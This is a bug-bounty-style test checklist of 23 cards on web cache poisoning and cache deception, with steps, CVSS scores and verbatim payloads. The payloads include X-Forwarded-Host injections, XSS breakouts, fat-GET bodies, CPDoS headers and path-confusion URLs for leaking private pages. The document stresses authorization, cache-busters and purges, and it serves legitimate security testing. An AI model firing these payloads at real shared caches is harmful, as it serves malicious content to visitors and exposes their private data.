# Web Cache Poisoning — Checklist

Expert per-attack **test-case matrix** for Web Cache Poisoning — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*23 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## WCACHE-001 — Confirm a cache is present
**Test Category:** Recon — Map the Cache · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Any response on the target

**Test Steps:** 1. Request a path twice with the SAME cache-buster value; a 2nd-request HIT (or a growing Age) proves caching.<br>2. Look for Cache-Control: public and cacheable extensions/paths.<br>3. Note which responses are cached vs DYNAMIC.

**Expected Result:** The second identical request returns a cache HIT / rising Age - a cache is in play.

**Payload Example:**

```
curl -s -D- -o/dev/null 'https://$TARGET/path?cb=SAME'   (send twice; 2nd = HIT)
```

**Impact:** No cache = no cache bug; establishes the pre-condition.

**Tools:** Burp Repeater, curl, poc/cache_detect.py

**References:** CWE-349; PortSwigger Web Security Academy: Web cache poisoning; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018)

---

## WCACHE-002 — Fingerprint the cache layer
**Test Category:** Recon — Map the Cache · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Response headers

**Test Steps:** 1. Identify the layer from headers: CF-Cache-Status+cf-ray (Cloudflare); X-Cache+X-Served-By+X-Timer (Fastly); Hit from cloudfront+X-Amz-Cf-Id (CloudFront); AkamaiGHost/X-Akamai-* (Akamai); X-Varnish two IDs (Varnish); X-Vercel-Cache (Vercel); X-Drupal-Cache (Drupal).<br>2. The layer decides caching rules and deception behaviour (e.g. Cloudflare Cache Deception Armor).

**Expected Result:** The CDN/cache vendor is identified from its status headers.

**Payload Example:**

```
CF-Cache-Status: HIT + cf-ray  |  X-Cache: HIT from cloudfront + X-Amz-Cf-Id
```

**Impact:** Vendor dictates which delimiter/extension rows work and which mitigations apply.

**Tools:** Burp, curl, poc/cache_detect.py, Wappalyzer

**References:** CWE-349; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018)

---

## WCACHE-003 — Build a reliable HIT/MISS oracle
**Test Category:** Recon — Map the Cache · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Cacheable response

**Test Steps:** 1. Establish a clear oracle: X-Cache / CF-Cache-Status / Age / timing / a dynamic marker.<br>2. Confirm MISS-then-HIT on a fresh key.<br>3. You need this oracle to prove 'served to a different request' later.

**Expected Result:** A dependable signal that distinguishes a cached HIT from a fresh MISS.

**Payload Example:**

```
watch CF-Cache-Status: MISS -> HIT ; Age: 0 -> >0 on repeat
```

**Impact:** The oracle is what turns 'reflected' into 'cached and re-served' - the actual finding.

**Tools:** Burp Repeater, curl

**References:** CWE-349; PortSwigger Web Security Academy: Web cache poisoning

---

## WCACHE-004 — Establish cache-buster isolation (SAFETY, do first)
**Test Category:** Discovery — Cache-Buster · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Every poisoning probe

**Test Steps:** 1. Add a unique buster so payloads land on YOUR key, never the shared prod entry: ?cb=UNIQUE (or utm_x=, or /path/;cb=UNIQUE if query is unkeyed).<br>2. VERIFY it is KEYED: each new value = a fresh MISS (Age:0).<br>3. If your buster is ALSO unkeyed you have NO isolation - do NOT fire payloads at a shared cache.

**Expected Result:** Each new buster value yields a fresh MISS, proving your requests are isolated to your own key.

**Payload Example:**

```
?cb=UNIQUE   ?utm_x=UNIQUE   /path/;cb=UNIQUE
```

**Impact:** Prevents poisoning real users during testing - the core safety control for this class.

**Tools:** Burp Repeater, curl

**References:** CWE-349; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018); PortSwigger Web Security Academy: Web cache poisoning

---

## WCACHE-005 — Unkeyed-input discovery via canary headers
**Test Category:** Discovery — Unkeyed Inputs · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Where to Test / Injection Point:** High-yield unkeyed headers + Param Miner brute

**Test Steps:** 1. Plant a canary in unkeyed headers: X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Forwarded-Proto/Server/Port, X-Original-URL, Forwarded, X-Forwarded-For.<br>2. 4-step confirm (cache-busted): (a) send with header, (b) canary reflected?, (c) resend WITHOUT the header, (d) still reflected? = UNKEYED + POISONABLE.<br>3. Run Param Miner for custom unkeyed headers/params. Note WHERE it reflects (script src/link/Location/canonical/raw HTML/JSON).

**Expected Result:** A header not in the cache key is reflected AND served to a request that did not send it.

**Payload Example:**

```
X-Forwarded-Host: canary8f3a.$COLLAB
Forwarded: host=canary8f3a.$COLLAB
```

**Impact:** Unkeyed reflected input is the root cause of all poisoning - this finds it.

**Tools:** Param Miner, Burp Repeater, poc/poison_probe.py

**References:** CWE-349; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018); PortSwigger Web Security Academy: Web cache poisoning

---

## WCACHE-006 — Cached mass-XSS via unkeyed header into resource URL
**Test Category:** Poisoning · **Severity:** Critical · **CVSS:** 9.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Unkeyed header reflected into &lt;script src&gt;/&lt;link href&gt;/import

**Test Steps:** 1. Set the unkeyed header so it lands in a resource URL: X-Forwarded-Host: $YOURHOST.<br>2. Serve a HARMLESS alert(document.domain) from $YOURHOST, on YOUR cache-busted key only.<br>3. Prove the poisoned response is served to a SECOND request on the same key.

**Expected Result:** The cached page loads a script from your host, executing on every request to that key.

**Payload Example:**

```
X-Forwarded-Host: $YOURHOST
  -> <script src="//$YOURHOST/app.js">  (benign alert(document.domain))
```

**Impact:** Cached site-wide XSS served to every visitor of the poisoned key - Critical.

**Tools:** Param Miner, Burp Repeater

**References:** CWE-349; CWE-79; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018); PortSwigger Web Security Academy: Web cache poisoning

---

## WCACHE-007 — Cached open redirect via unkeyed Host/Scheme
**Test Category:** Poisoning · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Unkeyed header reflected into Location / canonical

**Test Steps:** 1. Classic pair: X-Forwarded-Host: $YOURDOM + X-Forwarded-Scheme: nothttps forces a redirect to https://$YOURDOM.<br>2. Confirm the Location is cached and served to others.<br>3. Chain to OAuth/token theft via a redirect back through the OAuth flow.

**Expected Result:** The cached response redirects to your domain and is served to subsequent requests.

**Payload Example:**

```
X-Forwarded-Host: $YOURDOM
X-Forwarded-Scheme: nothttps
```

**Impact:** Cached open redirect -&gt; phishing / OAuth token theft at scale - High to Critical.

**Tools:** Param Miner, Burp Repeater

**References:** CWE-349; CWE-601; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018)

---

## WCACHE-008 — Cached reflected-XSS via unkeyed header into raw HTML
**Test Category:** Poisoning · **Severity:** Critical · **CVSS:** 9.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Unkeyed header reflected unencoded into HTML body/attribute

**Test Steps:** 1. Break out of the HTML/attribute context via the header value.<br>2. X-Forwarded-Host: a"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; (raw HTML) or the accesskey/onclick attribute-breakout form.<br>3. Confirm cached + served to others.

**Expected Result:** The unencoded header value executes as HTML in the cached response.

**Payload Example:**

```
X-Forwarded-Host: a"><script>alert(document.domain)</script>
X-Forwarded-Host: a'accesskey='x'onclick='alert(document.domain)
```

**Impact:** Cached reflected XSS delivered to all visitors of the key - Critical.

**Tools:** Param Miner, Burp Repeater

**References:** CWE-349; CWE-79; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018)

---

## WCACHE-009 — Resource poisoning (cached JS/CSS reflects input)
**Test Category:** Poisoning · **Severity:** Critical · **CVSS:** 9.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** Cached static resource (config.js) reflecting an unkeyed header/param

**Test Steps:** 1. Find a cached JS/CSS that reflects your input (e.g. window.API from X-Forwarded-Host).<br>2. Poison it so it points at your host: window.API="//$YOURHOST".<br>3. Every page importing that resource is affected site-wide.

**Expected Result:** The cached JS/CSS embeds your value and is loaded across the whole site.

**Payload Example:**

```
GET /static/config.js?cb=U  with  X-Forwarded-Host: $YOURHOST  -> window.API="//$YOURHOST"
```

**Impact:** Site-wide compromise via a single poisoned cached resource - Critical.

**Tools:** Param Miner, Burp Repeater

**References:** CWE-349; CWE-79; PortSwigger 'Web Cache Entanglement' (Kettle 2020)

---

## WCACHE-010 — Fat GET poisoning (origin reads GET body)
**Test Category:** Poisoning · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Endpoints where the origin reads a body on GET but the cache ignores it

**Test Steps:** 1. Send a GET with a body; the cache keys on the URL only, the origin parses the body.<br>2. Put the payload in the body: q="&gt;&lt;script&gt;alert(1)&lt;/script&gt;.<br>3. Confirm the body-driven output is cached under the bodyless key.

**Expected Result:** The origin's body-influenced response is cached and served to plain GETs.

**Payload Example:**

```
GET /search?cb=U HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

q="><script>alert(1)</script>
```

**Impact:** Poisons a key using input the cache never saw - bypasses body-unaware keying.

**Tools:** Burp Repeater

**References:** CWE-349; PortSwigger 'Web Cache Entanglement' (Kettle 2020)

---

## WCACHE-011 — Parameter cloaking (duplicate/array/delimiter split)
**Test Category:** Poisoning · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Params the cache and origin parse differently

**Test Steps:** 1. Duplicate/array: &amp;lang=en&amp;lang=&lt;payload&gt; ; &amp;param[]=a&amp;param[]=&lt;payload&gt;.<br>2. Delimiter cloaking: &amp;utm_content=x;callback=&lt;payload&gt; (';') or &amp;keyed=x%0acallback=&lt;payload&gt; (encoded newline) - cache sees one value, origin splits.<br>3. JSONP: /jsonp?callback=&lt;payload&gt; reflected into JS.

**Expected Result:** The origin evaluates a payload the cache excluded from (or merged into) the key.

**Payload Example:**

```
/p?cb=U&utm_content=x;callback=<payload>
/jsonp?cb=U&callback=<payload>
```

**Impact:** Cache-key vs origin parser mismatch -&gt; cached XSS via a smuggled parameter.

**Tools:** Param Miner, Burp Repeater

**References:** CWE-349; CWE-79; PortSwigger 'Web Cache Entanglement' (Kettle 2020)

---

## WCACHE-012 — Cache-key normalization / entanglement
**Test Category:** Poisoning · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Case/decoding/trailing differences between cache key and origin

**Test Steps:** 1. Probe where the cache normalizes the key but the origin does not (or vice-versa): case, URL-decoding, trailing chars.<br>2. Find a variant that keys to the victim's URL yet carries your payload.<br>3. Confirm the entangled response is served on the normal key.

**Expected Result:** A normalization mismatch lets your payload land on the victim's cache key.

**Payload Example:**

```
/PATH vs /path ; /path%2f vs /path/ ; trailing-dot/encoding differences
```

**Impact:** Advanced keying-mismatch poisoning against 'safe-looking' inputs.

**Tools:** Burp Repeater, Param Miner

**References:** CWE-349; PortSwigger 'Web Cache Entanglement' (Kettle 2020)

---

## WCACHE-013 — DOM / multi-step / internal reflection poisoning
**Test Category:** Poisoning · **Severity:** High · **CVSS:** 8.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Unkeyed input cached into JSON/JS the client later sinks

**Test Steps:** 1. The reflection lands in cached JSON/JS config the client reads into a DOM sink.<br>2. Poison the cached data so the client-side code executes it (e.g. a URL used by fetch/eval/innerHTML).<br>3. Confirm cross-request delivery + client execution.

**Expected Result:** Cached client-facing data drives a DOM XSS / SSRF-like action for every visitor.

**Payload Example:**

```
cached window.config.redirect = '//$YOURHOST' consumed by client JS
```

**Impact:** Cached DOM XSS / client-side redirect at scale - High to Critical.

**Tools:** Burp Repeater, DOM Invader

**References:** CWE-349; CWE-79; PortSwigger 'Web Cache Entanglement' (Kettle 2020)

---

## WCACHE-014 — CPDoS (HHO / HMC / HMO) — cached error DoS
**Test Category:** Poisoning — Availability · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Where to Test / Injection Point:** AUTHORIZED only; prove on YOUR key

**Test Steps:** 1. HHO (oversize header): X-Oversized-Header: AAAA...(8-20KB) -&gt; origin 400/431, CDN caches the error.<br>2. HMC (meta char): X-Meta: \n / %00 -&gt; origin rejects, cache stores.<br>3. HMO (method override): X-HTTP-Method-Override: DELETE -&gt; origin errors, cached for the GET key.<br>4. Confirm a NORMAL request to the same busted key returns the cached 4xx. NEVER run against the live shared key.

**Expected Result:** A normal follow-up request to the same key receives the cached error response.

**Payload Example:**

```
X-Oversized-Header: AAAA...(15KB)
X-HTTP-Method-Override: DELETE
```

**Impact:** Cache-poisoned denial of service - resource made unavailable to users (authorize first).

**Tools:** Burp Repeater

**References:** CWE-349; CWE-400; CPDoS (Nguyen et al.); PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018)

---

## WCACHE-015 — Smuggling -&gt; shared-cache poisoning
**Test Category:** Poisoning — Chain · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Desync-vulnerable chain (see request_smuggling.csv)

**Test Steps:** 1. If the target is request-smuggling-vulnerable, smuggle so a malicious response is stored under a victim URL.<br>2. Prove on a benign/unique key first, then describe shared-cache mass impact.<br>3. Cross-reference the Request Smuggling kit for the desync primitive.

**Expected Result:** A desync causes an attacker-influenced response to be cached for a victim URL.

**Payload Example:**

```
smuggle a prefix -> poisoned response cached for /  (benign-key proof)
```

**Impact:** Turns a desync into persistent, cache-backed mass XSS/redirect - Critical.

**Tools:** Burp HTTP Request Smuggler, Turbo Intruder

**References:** CWE-349; CWE-444; PortSwigger 'Practical Web Cache Poisoning' (Kettle 2018)

---

## WCACHE-016 — Cache deception — static-suffix path confusion
**Test Category:** Deception · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sensitive authed endpoint (/account, /api/me, /settings, /orders)

**Test Steps:** 1. With YOUR session, append a static suffix: /account.css, /account/x.js, /account/nonexistent.css.<br>2. Watch for (a) your PRIVATE content returned AND (b) a cache HIT on a session-less repeat.<br>3. The origin serves the dynamic page; the cache stores it as a 'static' asset.

**Expected Result:** The authed page returns your private data yet is cached as a static resource.

**Payload Example:**

```
/account.css   /account/x.js   /account/nonexistent.css
```

**Impact:** Private-response caching -&gt; cross-user data leak (severity by leaked content).

**Tools:** Burp Repeater, curl, poc/deception_probe.py

**References:** CWE-524; CWE-525; Omer Gil 'Web Cache Deception Attack' (2017); PortSwigger Web Security Academy: Web cache deception

---

## WCACHE-017 — Cache deception — delimiter/encoding matrix
**Test Category:** Deception · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sensitive endpoint; CDN that keys on extension

**Test Steps:** 1. Encoded delimiters where the origin truncates at the DECODED char but the cache keys the .css suffix: /account%3f.css (?), /account%23.css (#), /account%2f.css (/), /account%00.css, /account%0a.css, /account%3b.css (;).<br>2. Path-parameter form: /account;x.css.<br>3. Double/mixed encoding: /account%252ecss.<br>4. Cloudflare Cache Deception Armor -&gt; use a ';'/encoded-delimiter row (Content-Type must match ext).

**Expected Result:** A delimiter/encoding variant returns private content AND flips to a cache HIT.

**Payload Example:**

```
/account%3f.css   /account;x.css   /account%252ecss
```

**Impact:** Defeats extension-matching and Cache Deception Armor to cache private pages.

**Tools:** Burp Repeater, poc/deception_probe.py

**References:** CWE-524; CWE-525; PortSwigger Web Security Academy: Web cache deception

---

## WCACHE-018 — Cache deception — directory-rule confusion
**Test Category:** Deception · **Severity:** High · **CVSS:** 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** CDNs caching whole static directories

**Test Steps:** 1. Route a dynamic page 'under' a cached static dir via traversal: /static/..%2faccount, /assets/%2e%2e/settings, /media/..%2f..%2fapi/me.<br>2. The cache treats it as living in the static dir and stores it.<br>3. Confirm private content + HIT.

**Expected Result:** A dynamic sensitive page is cached because its path appears under a static directory.

**Payload Example:**

```
/static/..%2faccount
/assets/%2e%2e/settings
```

**Impact:** Caches private pages via directory-rule confusion - cross-user leak.

**Tools:** Burp Repeater

**References:** CWE-524; CWE-525; PortSwigger Web Security Academy: Web cache deception

---

## WCACHE-019 — Deception two-session confirm + severity grading
**Test Category:** Deception — Confirmation · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** A deception-prone variant found above

**Test Steps:** 1. Two-session proof: (A) fetch with YOUR cookie -&gt; a benign private marker in the body + cacheable; (B) fetch the SAME URL with NO cookie -&gt; the SAME marker = deception PROVEN.<br>2. Grade the leaked body: session/token/bearer/reset/api-key = Critical (ATO); CSRF/PII = High.<br>3. Use two of your OWN accounts; one cross-session proof, then STOP; recommend a purge.

**Expected Result:** A session-less request retrieves the private marker cached from your authenticated request.

**Payload Example:**

```
A) curl .../account/x.css -H 'Cookie: session=YOURS'  -> marker
B) curl .../account/x.css               -> same marker, no cookie
```

**Impact:** Confirms real cross-user leakage; token/reset in the body = account takeover.

**Tools:** curl, Burp Repeater, poc/deception_probe.py

**References:** CWE-524; CWE-525; Omer Gil 'Web Cache Deception Attack' (2017); PortSwigger Web Security Academy: Web cache deception

---

## WCACHE-020 — Browser cache / bfcache leakage
**Test Category:** Variants · **Severity:** Medium · **CVSS:** 5.5 (CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Sensitive pages after logout

**Test Steps:** 1. Load a sensitive page, log out, then press Back / reopen from history.<br>2. If the page is restored from browser cache/bfcache, it lacks Cache-Control: no-store, private.<br>3. Confirm sensitive data is shown post-logout on a shared device.

**Expected Result:** The sensitive page is restored from the browser cache after logout.

**Payload Example:**

```
response missing Cache-Control: no-store, private on /account
```

**Impact:** Sensitive-data exposure on shared devices - Medium to High.

**Tools:** Browser DevTools

**References:** CWE-525; PortSwigger Web Security Academy: Web cache deception

---

## WCACHE-021 — Cache-key injection (populate/predict a victim's key)
**Test Category:** Variants · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Caches where the key includes attacker-influenceable components

**Test Steps:** 1. Identify key components you can influence (unkeyed-turned-keyed via a header the victim also sends).<br>2. Pre-populate or predict the victim's exact cache key.<br>3. Store a malicious entry the victim will HIT.

**Expected Result:** You place a crafted entry on a cache key the victim's request will match.

**Payload Example:**

```
influence a keyed header the victim also sends -> pre-seed their key
```

**Impact:** Targeted poisoning of a specific victim's cache entry - High.

**Tools:** Burp Repeater, Param Miner

**References:** CWE-349; PortSwigger 'Web Cache Entanglement' (Kettle 2020)

---

## WCACHE-022 — False-positive filter
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. Reject: a header/param reflected but the response NOT cached (self-XSS/plain reflection); the input is KEYED (a request without it loses your canary); Cache-Control: public with NO actual HIT; deception that works only with YOUR cookie (you fetched your own page); CF-Cache-Status: DYNAMIC / Age:0 on every variant; 'Param Miner said unkeyed' with no reflection+served-to-others+impact; an open redirect that is NOT cached; CPDoS that only errors the origin (never cached).<br>2. Require the 'served to a different request' (poison) or cross-session (deception) half - not just reflection.

**Expected Result:** A reproduced served-to-others / cross-session effect - not reflection, keyed input, or an uncached error.

**Payload Example:**

```
poison: canary served to a request that didn't send it | deception: marker returned with no cookie
```

**Impact:** Protects credibility; this class is dense with reflection-looks-like-a-bug false positives.

**Tools:** Burp, manual

**References:** CWE-349; CWE-524; PortSwigger Web Security Academy: Web cache poisoning

---

## WCACHE-023 — Client-facing impact &amp; safe-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with the highest impact (cached mass-XSS &gt; cached redirect &gt; deception ATO).<br>2. Provide the exact request, the unkeyed input / deception variant, the HIT/served-to-others evidence, and a benign marker; use a cache-buster and your own accounts throughout.<br>3. Set CVSS 3.1 + CWE-349 (poisoning) / CWE-524-525 (deception) + delivered CWE-79/601/400. Remediation: cache only truly static responses, key on all influential inputs, strip/normalize unkeyed headers at the edge, set Cache-Control: no-store, private on authed pages, disable body-on-GET, match Content-Type to extension.<br>4. RECOMMEND A CACHE PURGE; de-dupe to one root cause.

**Expected Result:** A reproducible, correctly-rated, benign PoC with remediation and a purge recommendation.

**Payload Example:**

```
PoC: request + unkeyed input/variant + HIT evidence + CVSS + CWE + purge recommendation.
```

**Impact:** Converts the finding into a defensible report and prevents lingering poisoned entries.

**Tools:** Burp, CVSS calculator, WEB_CACHE_REPORT_TEMPLATE.md

**References:** CWE-349; CWE-524; FIRST CVSS v3.1; PortSwigger Web Security Academy: Web cache deception  |  TOP REFERENCES: James Kettle 'Practical Web Cache Poisoning' + 'Web Cache Entanglement' (PortSwigger Research); Omer Gil 'Web Cache Deception' (BlackHat); PortSwigger Academy

---
